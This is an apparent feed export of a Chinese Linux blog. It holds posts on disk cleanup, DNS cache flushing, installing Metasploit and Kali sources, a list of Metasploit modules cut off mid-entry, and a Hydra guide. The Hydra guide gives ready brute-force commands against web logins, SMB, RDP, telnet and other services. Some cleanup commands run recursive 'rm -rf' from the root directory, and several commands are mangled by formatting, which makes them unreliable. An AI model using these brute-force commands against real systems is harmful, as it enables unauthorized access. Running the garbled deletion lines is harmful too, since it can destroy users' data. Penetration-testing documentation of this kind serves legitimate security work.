      <content type="html"><![CDATA[<p><a href="http://www.linuxde.net/" target="_blank" rel="external">Linux</a> 计算机安装后，在我们不断的使用过程中，因为添加、删除软件和上网冲浪、调试程序等行为，硬盘中会产生各种各样的垃圾文件，而随着这些垃圾文件的不断膨胀，它们不仅会平白吞噬掉我们宝贵的硬盘空间，更会拖累机器的运行速度，影响我们的工作效率。本文介绍一下给 Linux 系统减肥的方法和工具的使用技巧，本文使用的 Linux 发行版本是 <a href="http://www.linuxde.net/tag/ubuntu" target="_blank" rel="external">Ubuntu</a> 12.04 。本文介绍的工具包括：Activity Log Manager、BleachBit、find、fdupes、Geeqie、GConf Cleaner，这些工具都是开源工具，Linux 用户可以通过下载编译源代码在其他流行的 Linux 版本（如 Redhat、SUSE 等）上使用。</p>
<p>Linux 下哪些文件属于垃圾文件</p>
<p><strong>软件安装过程中产生的临时文件 　</strong></p>
<p>许多 bin 格式的软件在安装时，首先要把自身的安装文件解压缩到一个临时目录（一般为/tmp 目录）然后再进行安装。如果软件设计有疏忽或者系统有问题，当安装结束后，这些临时文件就会变得并不“临时”，成为硬盘里的一堆垃圾，很多时候它们以*.tmp 的面孔出现。</p>
<p><strong>软件运行过程中产生的临时文件</strong></p>
<p>和安装过程一样，在软件的运行过程中通常也会产生一些临时交换文件，有些软件运行过后遗留下来的垃圾甚至多达数百兆，比如 SSH <a href="http://www.linuxde.net/tag/%e6%9c%8d%e5%8a%a1%e5%99%a8" target="_blank" rel="external">服务器</a>和客户端连接过程中时产生的文件。还有<a href="http://www.linuxde.net/tag/%e8%99%9a%e6%8b%9f%e6%9c%ba" target="_blank" rel="external">虚拟机</a>运行时产生的文件。另外我们删除一个账户之后,还会存在一些无用垃圾文件及目录。</p>
<p><strong>上网冲浪产生的临时文件</strong></p>
<p>我们在上网的时候，<a href="http://www.linuxde.net/tag/%e6%b5%8f%e8%a7%88%e5%99%a8" target="_blank" rel="external">浏览器</a>总是将网页文件下载到本地机器上，这些缓存文件不但占用了宝贵的磁盘空间，还常常会把我们的个人隐私公之于众。</p>
<p><strong>一些不常用的鸡肋文件</strong></p>
<p>比如一些应用软件自带的帮助和系统手册页等。既然食之无味索性也将它们视作垃圾文件的一种表现。占用空间甚大，更会严重拖累系统和一些图形处理软件的运行速度。另外还有一些损坏的桌面文件，它包括损坏的应用程序菜单按钮和文件关联。</p>
<p><strong>各种缓存文件</strong></p>
<p>如果 Linux 用户安装使用 GIMP 或者 Geeqie 等图形编辑工具，在这些软件都有图片预览功能，在保存了图片的文件夹下会产生一个名为“Thumbs.db”的文件，这个文件会随着图片文件的增加而膨胀。还有就是.DS_Store 文件，DS_Store 文件是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。删除以后的副作用就是这些信息的失去。另外还有使用 apt 或者 YUM 软件包安装过程中生成的缓存文件。</p>
<p>使用 Linux 命令删除垃圾文件<br>删除用户后遗留下的垃圾文件</p>
<p>这里我们使用到的主要命令是 find 。举个例子： 我们删除一个账户之后,还会存在一些无用垃圾文件及目录,我们要找出属于这个用户的垃圾东西，使用 find / -user 用户名 :就可以找到根目录下属于这个用户的相关文件 ，使用命令：</p>
<p>#find ./ -nouser  |xargs rm –rfcore 文件</p>
<p>当我们在系统下运行某个程序出错的时候，系统会自动将残留在内存中的数据存成 core 文件，久而久之，系统中遗留下来的 core 会越来越多，就像灰尘一样散落在系统的每一个角落里很是烦人。这个时候，我们就可以应用 find 命令加上—exec 参数来清理它们。使用命令：</p>
<h1 id="find-name-core-print-exec-rm-rf-多余的手册页"><a href="#find-name-core-print-exec-rm-rf-多余的手册页" class="headerlink" title="find / -name core -print -exec rm -rf {} ;多余的手册页"></a>find / -name core -print -exec rm -rf {} ;多余的手册页</h1><p>另外 Linux 提供了众多语言的手册页（man）比如 Ubuntu 的 手册页位于/usr/share/man 目录下 ，可以使用命令删除多余语言的手册页保留中英文即可。</p>
<h1 id="cd-usr-share-man-find-maxdepth-1-type-d-tail-n-2-grep-E-v-‘-en-zh-man-’-while-read-d-do-rm-rf-d-done"><a href="#cd-usr-share-man-find-maxdepth-1-type-d-tail-n-2-grep-E-v-‘-en-zh-man-’-while-read-d-do-rm-rf-d-done" class="headerlink" title="cd /usr/share/man # find ./ -maxdepth 1 -type d | tail -n +2 | grep -E -v ‘(en|zh|man).*’ |      while read d; do rm -rf $d; done"></a>cd /usr/share/man # find ./ -maxdepth 1 -type d | tail -n +2 | grep -E -v ‘(en|zh|man).*’ |      while read d; do rm -rf $d; done</h1><p>说明:关键字是(en|zh|man) ，您可以根据自己的情况修改。</p>
<p>使用 fdupes 工具删除指定目录下重复文件</p>
<p>fdupes 是一个命令行工具，它会查找和删除指定目录的重复文件，它通过文件的大小和 MD5 值进行比较 。一个字节一个字节进行对比。 首先安装这个工具</p>
<h1 id="apt-get-install-fdupes"><a href="#apt-get-install-fdupes" class="headerlink" title="apt-get install fdupes"></a>apt-get install fdupes</h1><p>在 /etc 目录查找重复文件 ，使用如下命令：</p>
<p>#fdupes /etc</p>
<p>可以与 Linux 命令组合使用，删除文件 ：</p>
<p>#fdupes -r -f . | grep -v ^$ | tee duplicate.txt cat duplicate.txt |      while read file; do rm -v “$file”; done</p>
<p>另外也可以与 sed 命令组合使用，删除文件 ：</p>
<h1 id="fdupes-r-n-S-tmp-sed-r-“s-rm-”-”-sed-r-“s-”-”-gt-duplicate-files-sh删除缓存文件"><a href="#fdupes-r-n-S-tmp-sed-r-“s-rm-”-”-sed-r-“s-”-”-gt-duplicate-files-sh删除缓存文件" class="headerlink" title="fdupes -r -n -S /tmp | sed -r “s/^/#rm ”/” | sed -r “s/$/”/” &gt;duplicate-files.sh删除缓存文件"></a>fdupes -r -n -S /tmp | sed -r “s/^/#rm ”/” | sed -r “s/$/”/” &gt;duplicate-files.sh删除缓存文件</h1><p>清理旧版本的软件缓存</p>
<h1 id="apt-get-autoclean"><a href="#apt-get-autoclean" class="headerlink" title="apt-get autoclean"></a>apt-get autoclean</h1><p>清理所有软件缓存：</p>
<p>#apt-get clean使用 Geeqie 工具找出相似图像文件</p>
<p>现在的硬盘容量是越来越大，出于备份的考虑，很多朋友会采取“宁滥勿缺”的原则保存图片，这就可能出现文件重复的情况，造成文件搜索的效率低下。要在海量的存储空间中找出重复的文档，并不是一件容易的工作。其实借助著名的图像浏览工具 Geeqie 可以很轻松地找出系统中的重复和相似图像文件。这些文件相比文本文件更大，时间长了会占用很多硬盘空间。使用上面介绍的 fdupes 工具就不行，因为 fdupes 工具只能删除完全相同 (md5sum 相同) 的重复文件, 但若要剔除 “相似” 的图片文件, 则可使用 geeqie 工具。首先安装这个工具：</p>
<h1 id="apt-get-install-gqview"><a href="#apt-get-install-gqview" class="headerlink" title="apt-get install gqview"></a>apt-get install gqview</h1><p>下面运行这个工具，在要搜索的目录上按鼠标右键, 选择 “Find duplicates recursive…”见图 1 。</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010510lXW.jpg" alt=""></p>
<p>选择左下角的 “Compare by:” 下拉菜单可选择比对方式 Similarity (custom)找出相似度 99% 以上的图片，另外可以勾选 “Thumbnails” 可显示缩略图见图 2</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010510cCt.jpg" alt=""></p>
<p>下面在被选取的项目上按鼠标右键, 点选 “Delete” 即可删除所有被选取的图片， 删除前会有一个的确认界面以免误删。说明 99%是图片相似度的缺省值，用户可以通过如下方式修改参数：在 Edit → Preferences → Preferences… → Behavior → Miscellaneous: Custom similarity threshold 见图 3 。</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010511iwZ.jpg" alt=""></p>
<p>使用 BleachBit 清理文件<br>简介</p>
<p>BleachBit 是一款开源免费的系统清理工具，功能类似 Windows 平台的 CCleaner。BleachBit 能够删除隐藏的垃圾文件，以及简单的保护你的隐私。擦除缓存，删除 cookies 文件，清除互联网浏览历史，删除未使用的本地化碎片日志，删除临时文件，是一款非常实用的<a href="http://www.linuxde.net/tag/%e8%b7%a8%e5%b9%b3%e5%8f%b0" target="_blank" rel="external">跨平台</a>的系统清理工具。BleachBit 提供有 rpm 和 deb 二进制包，适用于<a href="http://www.linuxde.net/tag/fedora" target="_blank" rel="external">Fedora</a>/<a href="http://www.linuxde.net/tag/centos" target="_blank" rel="external">CentOS</a>/RHEL、<a href="http://www.linuxde.net/tag/debian" target="_blank" rel="external">Debian</a>/Ubuntu 等 Linux 发行版。其它 Linux 用户可以选择 BleachBit 的源码包（下载地址：<a href="http://bleachbit.sourceforge.net/download.[PHP](http://www.linuxde.net/tag/php" target="_blank" rel="external">http://bleachbit.sourceforge.net/download.[PHP](http://www.linuxde.net/tag/php</a>) ）。使用 BleachBit，你可以清理系统中的缓存、历史、临时文件、cookies 等不需要的东西，这样可以释放你的磁盘空间。当前，BleachBit 能够清理 Beagle、Firefox、Epiphany、Flash、OpenOffice.org 、KDE、 GIMP、<a href="http://www.linuxde.net/tag/java" target="_blank" rel="external">JAVA</a> 编程工具、vim、Gedit 编辑器等 70 多种软件所产生的垃圾文件。还有系统运行时生成的“Thumbs.db”的文件和使用 apt 或者 YUM 软件包安装过程中生成的缓存文件以及剪切板里面的历史文件信息等。</p>
<p>首先安装软件：</p>
<p>#apt-get install bleachbit</p>
<p>安装之后<a href="http://www.linuxde.net/tag/%e7%b3%bb%e7%bb%9f%e5%b7%a5%e5%85%b7" target="_blank" rel="external">系统工具</a>菜单里就会多出两个工具：bleachbit 和 bleachbit as root。对于 root 用户使用第 2 个，软件第一次运行，弹出“首选项窗口”，见图 4。</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010511Y97.jpg" alt=""></p>
<p>简单说明一下设置界面：包括定制文件和文件夹，驱动器列表 ，语言，白名单（免于清理的）设置，以及是否开机启动 BleachBit 等一些选项。</p>
<p>下面看看工作界面见图 5。</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010512Z8v.jpg" alt=""></p>
<p>BleachBit 软件功能单一因此使用起来也方便。从图 5 里我能看到。 软件的左边罗列出了能够清理的各种垃圾，点击“预览“按钮，就会分析出垃圾文件的明细和大小。 勾选好软件按 clean（清除）按钮即可。</p>
<p>以 Chrome 浏览器为例介绍操作实例</p>
<p>Chrome 浏览器可以清理的文件主要包括：</p>
<ul>
<li>缓存: 删除那些网页缓冲文件(这些缓冲文件可以减少下次访问该网页的时间)</li>
<li>Cookies: 删除 cookies 文件，它们保存网站首选项、认证和身份等信息</li>
<li>当前会话: 删除当前会话</li>
<li>DOM(文档对象模型) 存储: 删除 <a href="http://www.linuxde.net/tag/html5" target="_blank" rel="external">HTML5</a> cookies</li>
<li>表单历史: 网站表单输入历史</li>
<li>历史: 删除已浏览网站、下载及缩略图的历史记录</li>
<li><a href="http://www.linuxde.net/tag/%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" target="_blank" rel="external">搜索引擎</a>: 重置搜索引擎使用历史并删除非内置搜索引擎，其中一些引擎为自动添加</li>
<li>整理<a href="http://www.linuxde.net/tag/%e6%95%b0%e6%8d%ae%e5%ba%93" target="_blank" rel="external">数据库</a>: 清理数据库碎片以减少空间并提高速度(无需删除任何数据)<br>首先查看可清理的 Chrome 浏览器文件见图 6 。</li>
</ul>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010512ijb.jpg" alt=""></p>
<p>选中欲清理的项目后，点击“预览“按钮即可执行对该类项目内所含垃圾文件的扫描操作，扫描过程非常快速，扫描过程完毕，用户将看到检测到的垃圾文件列表及其统计信息，下面用户只需鼠标点击“清理”按钮即可轻松清除这些已经被检测到的垃圾文件。</p>
<p>上面笔者选择执行的是对 Chrome 浏览器的扫描清理任务，当然可以选择全部垃圾列表中的所有项目，用户只需逐一勾选扫描项目选择激活项即可。</p>
<p>使用 Activity Log Manager 清理残留在系统中的使用痕迹</p>
<p>上网冲浪，用账号登录系统，包括使用一些编辑软件都会在系统里留下蛛丝马迹，这些残留信息中包含个人信息，如果被不法分子利用，就会造成隐私泄露，下面介绍的工具是 Activity Log Manager，它是配置在 Zeitgeist 活动日志中记录的内容的 ，使用它可以有效保护隐私。首先安装这个工具：</p>
<p>#apt-get install activity-log-manager</p>
<p>Activity Log Manager 的中文名称是活动日志管理器，安装完成后出现在附件菜单中。它的使用方法也比较简单。最直接的就是设置停止记录的功能，然后删除所有历史文件见图 7 。</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010512x8J.jpg" alt=""></p>
<p>当然用户也可以进行有区别的设置，可以根据具体情况设置哪些应用程序和文件可以保留历史文件那些不保留。下面通过“文件”界面进行设置见图 8</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010513gJh.jpg" alt=""></p>
<p>这里笔者选择“电子表格、文本、即时消息”三个事关隐私的选项。另外对于一些特殊的应用程序用户还可以自己添加到活动日志管理器中，见图 9</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/0105132ER.jpg" alt=""></p>
<p>使用 GConf Cleaner 清理 GConf</p>
<p>GConf 是一个用于存储 GNOME 应用程序选项设置的系统。如果该系统充斥着大量无用键值，那么将使 GConf 臃肿不堪。这对应用程序的启动速度和性能都是有影响的。为了解决这个问题，你可以使用 GConf Cleaner 来对其进行清理。Gconf-Cleaner 是一款类似于 Windows 注册表清理器的工具。它会检查 Gconf 数据库（即 GNOME 配置数据库）并移除无用及过时的项目。</p>
<p>首先安装这个工具：</p>
<p>#apt-get install gconf-cleaner</p>
<p>然后从终端执行 gconf-cleaner 启动 GConf Cleaner 程序。这个程序具有执行向导，只需按步骤操作即可。 向导初始画面，点击 Forward 会进入分析过程。图 10 是分析结果，它提供具体数据，并可保存。再次点击 Forward 则开始清理过程。</p>
<p><img src="http://www.linuxde.net/wp-content/uploads/2013/10/010513YNI.jpg" alt=""></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[如何在 Linux/Unix/Mac 下清除 DNS 查询缓存]]></title>
      <url>http://www.linux52.com/2015-06-25-e5-a6-82-e4-bd-95-e5-9c-a8-linuxunixmac-e4-b8-8b-e6-b8-85-e9-99-a4-dns-e6-9f-a5-e8-af-a2-e7-bc-93-e5-ad-98.html</url>
      <content type="html"><![CDATA[<p>我在Linux下使用拨号连接上网，频繁的拨号断线造成DNS的问题。我如何在Linux/Unix发行版下使用shell命令清除DNS缓存？</p>
<p>在MS-Windows下,你可以使用ipconfig命令来清除dns缓存。然而，Linux和Unix提供了不同的方法来清除缓存。Linux可以运行 nscd 或者 BIND 或者 dnsmasq 作为名称服务缓存守护进程。大型或者工作组服务器可能使用BIND或者dnsmasq作为专用缓存服务器来加速查询。</p>
<p><strong>清除 nscd dns 缓存</strong></p>
<p>Nscd 会缓存libc发起的名称服务的请求。如果把检索NSS数据看做很慢，那么nscd能够显著加快连续访问同一数据的速度，并能提高整个系统的性能。只需重启nscd即可刷新缓存：</p>
<blockquote>
<p>$ sudo services nscd restart<br><strong>清除 dnsmasq dns 缓存</strong></p>
</blockquote>
<p>dnsmasq的是一个轻量级的DNS、TFTP和DHCP服务器。它的目的是给局域网提供配对的DNS和DHCP服务。 dnsmasq接受DNS查询，并从一个小的本地高速缓存应答它们或将其转发到一个真正的递归DNS服务器。该软件也被安装在很多便宜的路由器上来缓存DNS查询。只需重新启动dnsmasq的服务来清除DNS缓存：</p>
<blockquote>
<h1 id="service-dnsmasq-restart"><a href="#service-dnsmasq-restart" class="headerlink" title="service dnsmasq restart"></a>service dnsmasq restart</h1><p>&nbsp;</p>
</blockquote>
<p><strong>清除BIND缓存服务器的dns缓存</strong></p>
<p>一台BIND缓存服务器从另一台服务器（区域主）响应主机的查询而获得信息，然后保存（缓存)数据到本地。您所要做的就是重启BIND以清除其缓存：</p>
<blockquote>
<h1 id="etc-init-d-named-restart"><a href="#etc-init-d-named-restart" class="headerlink" title="/etc/init.d/named restart"></a>/etc/init.d/named restart</h1></blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Zukimac 一款完美的 Ubuntu 用户 MAC 主题]]></title>
      <url>http://www.linux52.com/2015-06-25-zukimac-e4-b8-80-e6-ac-be-e5-ae-8c-e7-be-8e-e7-9a-84-ubuntu-e7-94-a8-e6-88-b7-mac-e4-b8-bb-e9-a2-98.html</url>
      <content type="html"><![CDATA[<div class="g-doc box"><br><div class="g-bd"><br><div class="g-bdc box"><br><div class="m-postdtl"><br><div class="m-post  m-post-txt  "><br><div class="postinner"><br><div class="ct"><br><div class="ctc box"><br><div class="txtcont"><br><br>主题下载地址：<br><br><em>   <a href="http://gnome-look.org/CONTENT/content-files/165450-Zukimac.tar.bz2" target="_blank" rel="external">下载Zukimac</a>
</em>   <a href="http://pan.baidu.com/s/1jGwsDEI" target="_blank" rel="external">下载Zukimac for GTK 3.10主题</a><br>*   <a href="http://pan.baidu.com/s/1kxFY2" target="_blank" rel="external">下载Zukimac for GTK 3.12主题</a><br><img src="http://imglf1.ph.126.net/r0-volHig5PuS1VOntUHWA==/6608215516028210200.jpg" alt=""><br><br></div><br></div><br></div><br></div><br></div><br></div><br></div><br></div><br><div class="g-ft"></div><br></div><br><div id="m-regGuideLayer" class="m-regGuideLayer f-trans js-show-regGuideLayer"><br><div class="bg"></div><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Hydra详解]]></title>
      <url>http://www.linux52.com/2015-06-25-hydra-e8-af-a6-e8-a7-a3.html</url>
      <content type="html"><![CDATA[<h2 id="Hydra详解"><a href="#Hydra详解" class="headerlink" title="Hydra详解"></a>Hydra详解</h2><div class="txtcont"><br>&gt; #hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]<br><strong>-R</strong><br>继续从上一次进度接着破解<br><br><strong>-S</strong><br>大写，采用SSL链接<br><br><strong>-s &lt;PORT&gt;</strong><br>小写，可通过这个参数指定非默认端口<br><br><strong>-l &lt;LOGIN&gt;</strong><br>指定破解的用户，对特定用户破解<br><br><strong>-L &lt;FILE&gt;</strong><br>指定用户名字典<br><br><strong>-p &lt;PASS&gt;</strong><br>小写，指定密码破解，少用，一般是采用密码字典<br><br><strong>-P &lt;FILE&gt;</strong><br>大写，指定密码字典<br><br><strong>-e &lt;ns&gt;</strong><br>可选选项，n：空密码试探，s：使用指定用户和密码试探<br><br><strong>-C &lt;FILE&gt;</strong><br>使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br><br><strong>-M &lt;FILE&gt;</strong><br>指定目标列表文件一行一条<br><br><strong>-o &lt;FILE&gt;</strong><br>指定结果输出文件<br><br><strong>-f</strong><br>在使用-M参数以后，找到第一对登录名或者密码的时候中止破解<br><br><strong>-t &lt;TASKS&gt;</strong><br>同时运行的线程数，默认为16<br><br><strong>-w &lt;TIME&gt;</strong><br>设置最大超时的时间，单位秒，默认是30s<br><br><strong>-v / -V</strong><br>显示详细过程<br><br><strong>server</strong><br>目标ip<br><br><strong>service</strong><br>指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等<br><br><strong>OPT</strong><br>可选项<br><br>get方式提交，破解web登录：<br>&gt; # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php<br>post方式提交，破解web登录：<br>&gt; &lt;form action=”index.php” method=”POST”&gt; &lt;input type=”text” name=”name” /&gt;&lt;BR&gt;&lt;br&gt; &lt;input type=”password” name=”pwd” /&gt;&lt;br&gt;&lt;br&gt; &lt;input type=”submit” name=”sub” value=”提交”&gt; &lt;/form&gt;<br>假设有以上一个密码登录表单，我们执行命令：<br>&gt; # hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&amp;pwd=^PASS^:&lt;title&gt;invalido&lt;/title&gt;”<br>破解https：<br>&gt; # hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https<br>破解teamspeak：<br>&gt; # hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak<br>破解cisco：<br>&gt; # hydra -P pass.txt 10.36.16.18 cisco<br>&gt;<br>&gt;<br>&gt; # hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable<br>破解smb：<br>&gt; # hydra -l administrator -P pass.txt 10.36.16.18 smb<br>破解pop3：<br>&gt; # hydra -l muts -P pass.txt my.pop3.mail pop3<br>破解rdp：<br>&gt; # hydra ip rdp -l administrator -P pass.txt -V<br>破解http-proxy：<br>&gt; # hydra -l admin -P pass.txt http-proxy://10.36.16.18<br>破解imap：<br>&gt; # hydra -L user.txt -p secret 10.36.16.18 imap PLAIN<br>&gt; # hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN<br>破解telnet<br>&gt; # hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V<br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu添加Kali软件源]]></title>
      <url>http://www.linux52.com/2015-06-25-ubuntu-e6-b7-bb-e5-8a-a0kali-e8-bd-af-e4-bb-b6-e6-ba-90.html</url>
      <content type="html"><![CDATA[<p>Kali软件源:</p>
<blockquote>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib</p>
<p>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali main non-free contrib</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali-security" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali-security</a> kali/updates main contrib non-free<br>导入Kali软件源公钥:<br>sudo apt-key adv –keyserver pgp.mit.edu –recv-keys ED444FF07D8D0BF6<br>更新软件库:<br>sudo apt-get update</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[GIT安装Metasploit]]></title>
      <url>http://www.linux52.com/2015-06-25-git-e5-ae-89-e8-a3-85metasploit.html</url>
      <content type="html"><![CDATA[<h2 id="GIT安装Metasploit（转）"><a href="#GIT安装Metasploit（转）" class="headerlink" title="GIT安装Metasploit（转）"></a><a href="http://kernelish.lofter.com/post/24e946_18934ef" target="_blank" rel="external">GIT安装Metasploit（转）</a></h2><div class="txtcont"><br><br>安装的几个步骤：<br><br><strong>0×00</strong>-从github上克隆Metasploit项目到本地；<br><br><strong>0×01</strong>-安装postgresql并进行配置；<br><br><strong>0×02</strong>-安装特定版本的ruby，并解决依赖；<br><br><strong>0×00 从github上克隆Metasploit项目到本地</strong>话说github真是什么都有，很多好的项目在上面都能找到，首先打开终端并输入下列命令，因为10.9.3自带了git，所以就不需要另外安装了<br><br>git clone <a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework.git</a> /usr/local/share/metasploit-framework克隆到本地后，将metasploit-framework/config/目录下的配置文件：database.yml 添加到环境变量中（database.yml 也许不存在，直接复制database.yml.example）<br><br>在$HOME/.bash_profile或者其他配置文件中添加下面这条配置<br><br>export MSF_DATABASE_CONFIG=/usr/local/share/metasploit-framework/config/database.yml<br><br><strong>0×01 安装postgresql并进行配置</strong><br><br>metasploit下载完后，不急着去配置，因为metasploit的默认数据库postgresql还没有装上<br><br>你可以直接使用brew来下载并自动安装postgresql，可以运行如下命令<br><br>brew install postgresql –without-ossp-build等待自动安装完毕，完成后，初始化postgresql（若出现错误删掉/usr/local/var/postgres，并重试）<br><br>initdb /usr/local/var/postgres初始化完毕后，为metasploit添加数据库用户和创建相应DB<br><br>createuser msf -P -h localhost  createdb -O msf msf -h localhost（上面参数不懂了，大家可以百度一下，这里就不做过多解释了）<br><br>上面的步骤完成后，需更改metasploit的数据库连接配置，也就是第一步中的database.yml文件<br><br>在database.yml中，将信息修改如下<br><br>production:    adapter: postgresql    database: msf    username: msf    password: &lt;yourpassword&gt;    host: 127.0.0.1    port: 5432    pool: 75    timeout: 5完成后，进入第三步！<br><br>（可自行添加alisa来简便每一次postgresql的启动）<br><br>alias pg_start=’pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start’alias pg_stop=’pg_ctl -D /usr/local/var/postgres stop’<br><br><strong>0×02 安装特定版本的ruby，并解决依赖</strong><br><br>说到ruby的多版本管理，这里就要用最给力的工具了rbenv（可以在github上找到，也可以使用brew直接安装）<br><br>brew install rbenv ruby-buildrbenv安装完成后，在$HOST/.bash_profile或其他配置文件中添加如下设置<br><br>eval “$(rbenv init -)”下面就可以通过rbenv来安装特定版本的ruby了，首先列出当前可用的ruby版本<br><br>rbenv install –list可以看到几乎所有的ruby版本都有，这里我们选择安装ruby-1.9.3-p547（因为OS X 10.9.3 自带的ruby为2.0.0版本，在某些地方会产生问题）<br><br>rbenv install 1.9.3-p547这里可能会等一会儿，rbenv会将各个版本的ruby安装在$HOST/.rbenv/versions/下，完成后，将下载的版本设置为系统默认<br><br>rbenv rehashrbenv global 1.9.3-p547完成后，重新打开终端，输入ruby –version就可以看到当前默认的ruby版本已经设置成为1.9.3-p547<br><br>下面安装bundle来解决依赖问题<br><br>gem install bundle安装的时候，可能会出连接问题，多试几次即可<br><br>bundle安装完毕后，再次进入metasploit的主目录解决模块包的依赖<br><br>cd /usr/local/share/metasploit-frameworkrbenv rehashbundle install<br>（在bundle install的过程中，可能会出现某一个特定版本的模块安装失败的问题，解决方法：根据GemFiles里的版本限制，自行使用gem安装替代版本，完成后，删掉GemFiles.lock，重新运行bundle install）<br><br>依赖解决后，即可运行目录下的msfconsole启动metasploit终端控制器（已启动postgresql，不然会连不上数据库）<br><br>可以将msf命令批量ln到bin下<br><br>for MSF in $(ls msf*); do ln -s /usr/local/share/metasploit-framework/$MSF /usr/local/bin/$MSF;done</div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[setoolkit && ghdb]]></title>
      <url>http://www.linux52.com/2015-06-25-setoolkit-ghdb.html</url>
      <content type="html"><![CDATA[<h2 id="setoolkit-amp-amp-ghdb"><a href="#setoolkit-amp-amp-ghdb" class="headerlink" title="setoolkit &amp;&amp; ghdb"></a><a href="http://kernelish.lofter.com/post/24e946_18bd801" target="_blank" rel="external">setoolkit &amp;&amp; ghdb</a></h2><div class="txtcont"><br>&gt; git clone <a href="https://github.com/trustedsec/social-engineer-toolkit/" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit/</a> set/<br>&gt;<br>&gt;<br>&gt; git clone <a href="https://github.com/offensive-security/exploit-database.git" target="_blank" rel="external">https://github.com/offensive-security/exploit-database.git</a><span style="text-decoration: underline;"> ghdb</span>/<br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[最受欢迎的10个Metasploit模块和插件(转载)]]></title>
      <url>http://www.linux52.com/2015-06-25-e6-9c-80-e5-8f-97-e6-ac-a2-e8-bf-8e-e7-9a-8410-e4-b8-aametasploit-e6-a8-a1-e5-9d-97-e5-92-8c-e6-8f-92-e4-bb-b6-e8-bd-ac-e8-bd-bd.html</url>
      <content type="html"><![CDATA[<p>## </p>
<div class="txtcont"><br><br><strong>1.MS12-020 Microsoft Remote Desktop Use-After-Free DoS (CVE-2012-0002, MSB-MS12-020):</strong><br>MS12-020是一个高危远程代码执行漏洞，可以通过向远程桌面端口发送特定的RDP包获得管理员权限。<br><br><strong>2.Microsoft Server Service Relative Path Stack Corruption (CVE-2008-4250, MSB-MS08-067):</strong> 一个流行了四年的经典漏洞了，可以稳定利用Windows 2003 Server和Windows XP，经久不衰。<br><br><strong>3.Microsoft Server Service NetpwPathCanonicalize Overflow (CVE-2006-3439, MSB-MS06-040):</strong> 一个六年的漏洞可以利用没有打官方补丁的Windows NT 4.0。如果你需要一个NT机器的远程root，这个module可能会是你的第一选择。<br><br><strong>4.Microsoft RPC DCOM Interface Overflow (CVE-2003-0352, MSB-MS03-026):</strong> Microsoft RPC接口远程溢出缺陷允许执行任意代码,也是一个骨灰级漏洞。<br><br><strong>5.Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop (CVE-2010-0017, MSB-MS10-006):</strong> 我们并不确定为什么这个module这么火，这个漏洞需要攻击者将特制的 SMB 响应发送到客户端发起的 SMB 请求，此漏洞可能允许远程执行代码。 要利用这些漏洞，攻击者必须诱使用户建立与恶意 SMB 服务器的 SMB 连接。<br><br><strong>6.Adobe PDF Embedded EXE Social Engineering (CVE-2010-1240):</strong> 这种 AdobeReader类型的漏洞不用多说，可以用来嵌入并执行Meterpreter，并使用比如社工的方法来利用。<br><br><strong>7.Apache mod_isapi &lt;= 2.2.14 Dangling Pointer (CVE-2010-0425):</strong> Apache HTTP Server 早于2.3.7版本的2.3.x系列核心mod_isapi模块modules/arch/win32/mod_isapi.c存在安全漏洞，如果远程用户向Apache服务器的mod_isapi模块发送了特制的请求之后又发送了重置报文，就可能导致从内存中卸载目标ISAPI模块<br><br><strong>8.Java AtomicReferenceArray Type Violation Vulnerability (CVE-2012-0507):</strong> 这个一开始被发现为java 0day。详情可查看<a href="http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html" target="_blank" rel="external">http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html</a><br><br><strong>9.Microsoft Windows Authenticated User Code Execution (CVE-1999-0504):</strong> 传说中的PSExec模块，熟悉msf的朋友都应该很清楚，hash传递等教科书般的方法就不多说了。<br><br><strong>10.Microsoft 